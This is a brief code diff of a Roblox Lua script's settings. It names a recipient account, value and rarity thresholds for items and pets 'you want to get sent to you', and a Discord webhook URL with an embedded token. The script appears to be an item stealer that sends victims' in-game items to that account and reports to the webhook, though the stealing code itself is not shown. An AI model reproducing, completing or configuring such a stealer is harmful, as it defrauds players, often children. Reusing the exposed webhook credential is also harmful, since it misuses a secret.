@@ -1,6 +1,6 @@
 Username = "Igotbanedagain1010"
 min_rap = 10000 -- minimum rap of each item you want to get sent to you. 10k by default
-min_chance = 100000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
+min_chance = 300000 -- minimum chance of pets you want to get sent to you. 10k by default, which means that it will not send pets under 1 in 10k
 webhook = "https://discord.com/api/webhooks/1296562382805667933/7e_GQOwJ2dgY5WMdn8hw_aatOMuGf8JvsBdLL5VQ8mmJ1Bw3x5rls2e23rmrFtba4R1g"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
